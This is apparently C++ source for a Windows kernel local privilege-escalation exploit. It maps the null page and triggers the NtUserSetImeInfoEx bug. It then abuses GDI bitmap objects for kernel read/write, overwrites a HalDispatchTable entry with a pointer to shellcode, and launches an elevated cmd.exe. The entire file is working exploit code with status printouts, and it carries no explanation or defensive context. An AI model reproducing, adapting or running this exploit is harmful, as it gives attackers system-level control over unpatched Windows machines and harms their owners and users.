#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <intrin.h>

#pragma comment(lib, "Psapi.lib")

extern "C" void shellcode7();
extern "C" void NtUserSetImeInfoEx(PVOID);


typedef NTSYSAPI NTSTATUS(NTAPI * _NtAllocateVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID *BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PULONG64 RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect);

typedef NTSTATUS(WINAPI * _NtQueryIntervalProfile)(
	IN ULONG ProfileSource,
	OUT PULONG Interval);

typedef struct GDICELL
{
	LPVOID pKernelAddress;
	USHORT wProcessId;
	USHORT wCount;
	USHORT wUpper;
	LPVOID pUserAddress;
};

DWORD gTableOffset = 0x0f8;

ULONG64 getpeb()
{
	ULONG64 p = (ULONG64)__readgsqword(0x30);
	p = *(ULONG64*)(p + 0x60);
	return p;
}

ULONG64 getgdi()
{
	return *(ULONG64*)(getpeb() + gTableOffset);
}

PVOID getpvscan0(HANDLE h)
{
	ULONG64 gtable = getgdi();
	ULONG64 p = gtable + LOWORD(h) * sizeof(GDICELL);
	GDICELL *c = (GDICELL *)p;
	return (char*)c->pKernelAddress + 0x50;
}

PVOID leakHal()
{
	UINT64 ntoskrnlBase;
	UINT64 HalDTUser, HalDTOffset;
	HMODULE userKernel;

	LPVOID drivers[1024];
	DWORD cbNeeded;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		if (drivers[0])
		{
			ntoskrnlBase = (UINT64)drivers[0];
		}
	}
	else
	{
		printf("[-] EnumDeviceDrivers failed; array size needed is %d\n", cbNeeded / sizeof(LPVOID));
	}
	
	userKernel = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!userKernel)
	{
		printf("[-] Could not load ntoskrnl.exe\n");
		return FALSE;
	}
	HalDTUser = (UINT64)GetProcAddress(userKernel, "HalDispatchTable");
	HalDTOffset = HalDTUser - (UINT64)userKernel;
	return (PVOID)(ntoskrnlBase + HalDTOffset);
}

int main(int argc, char const *argv[])
{
	HMODULE hntdll = GetModuleHandle(L"ntdll");
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress((HMODULE)hntdll, "NtAllocateVirtualMemory");
	if (!NtAllocateVirtualMemory)
	{
		printf("[-] Fail to resolve NtAllocateVirtualMemory(0x%X)\n", GetLastError());
		fflush(stdout);
		ExitProcess(1);
	}
	PVOID addr = (PVOID)0x100;
	UINT64 size = 0x1000;
	if (NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))
	{
		puts("[-] Fail to alloc null page!");
		fflush(stdout);
		ExitProcess(2);
	}

	HWINSTA hwinsta = CreateWindowStationW(0, 0, READ_CONTROL, 0);
	if (!hwinsta)
	{
		printf("[-] CreateWindowStationW fail(0x%X)\n", GetLastError());
		fflush(stdout);
		ExitProcess(3);
	}

	printf("[+] hwinsta is (0x%X)\n", hwinsta);
	fflush(stdout);

	if (!SetProcessWindowStation(hwinsta))
	{
		printf("[-] SetProcessWindowStation fail(0x%X)\n", GetLastError());
		fflush(stdout);
		ExitProcess(4);
	}

	UINT bbuf[0x60] = { 0x90 };
	HANDLE gManger = CreateBitmap(0x60, 1, 1, 32, bbuf);
	HANDLE gWorker = CreateBitmap(0x60, 1, 1, 32, bbuf);

	PVOID mpv = getpvscan0(gManger);
	PVOID wpv = getpvscan0(gWorker);

	printf("[+] Get gManager is %x,gWorker is %x\n", gManger, gWorker);
	printf("[+] Get manager at %llx,worker at %llx\n", mpv, wpv);
	fflush(stdout);

	char *pkl = 0;
	*(UINT64 *)(pkl + 0x28) = (UINT64)0xcafebabe;
	*(UINT64 *)(pkl + 0x50) = (UINT64)mpv - sizeof(PVOID);

	char ime[0x200];
	RtlSecureZeroMemory(&ime, 0x200);

	PVOID *p = (PVOID *)&ime;
	p[0] = (PVOID)0xcafebabe;
	p[1] = (PVOID)wpv;
	DWORD *pp = (DWORD *)&p[2];
	pp[0] = 0x180;
	pp[1] = 0xabcd;
	pp[2] = 6;
	pp[3] = 0x10000;
	pp[6] = 0x4800200;

	puts("[+] Triggering vulnerability...");
	fflush(stdout);
	fflush(stderr);
	NtUserSetImeInfoEx((PVOID)&ime);
	PVOID hal_dispatch_table = leakHal();
	printf("[+] hal_dispatch_table is at 0x%llx\n", hal_dispatch_table);

	int queryintervalprofile_offset = 0x8;
	PVOID oaddr = ((char*)hal_dispatch_table + queryintervalprofile_offset);
	PVOID pOrg = 0;
	PVOID sc = &shellcode7;
	printf("[+] shellcode at 0x%llx\n", sc);
	SetBitmapBits((HBITMAP)gManger, sizeof(PVOID), &oaddr);
	GetBitmapBits((HBITMAP)gWorker, sizeof(PVOID), &pOrg);
	SetBitmapBits((HBITMAP)gWorker, sizeof(PVOID), &sc);

	_NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(hntdll, "NtQueryIntervalProfile");
	if (!NtQueryIntervalProfile)
	{
		printf("[-] Fail to resolve NtQueryIntervalProfile(0x%X)\n", GetLastError());
		fflush(stdout);
		fflush(stderr);
		ExitProcess(1);
	}
	puts("[+] Elevating privilege...");
	fflush(stdout);

	ULONG interval = 0;
	system("pause");
	NtQueryIntervalProfile(0x1337, &interval);
	
	puts("[+] Cleaning up...");
	SetBitmapBits((HBITMAP)gWorker, sizeof(PVOID), &pOrg);

	STARTUPINFOA StartupInfo = { 0 };
	StartupInfo.wShowWindow = SW_SHOW;
	StartupInfo.cb = sizeof(STARTUPINFO);
	StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	PROCESS_INFORMATION ProcessInformation = { 0 };
	if (!CreateProcessA(NULL,
		"cmd.exe",
		NULL,
		NULL,
		FALSE,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&StartupInfo,
		&ProcessInformation))
	{
		printf("[-] Fail to create cmd.exe (0x%X)\n", GetLastError());
		fflush(stdout);
		fflush(stderr);
		ExitProcess(5);
	}
	printf("[+] Process created with pid %d!\n", ProcessInformation.dwProcessId);
	fflush(stdout);

	WaitForSingleObject(ProcessInformation.hProcess, INFINITE);

	// Close the open handles
	CloseHandle(ProcessInformation.hThread);
	CloseHandle(ProcessInformation.hProcess);
	puts("[+] bye!\n");
	return 0;
}

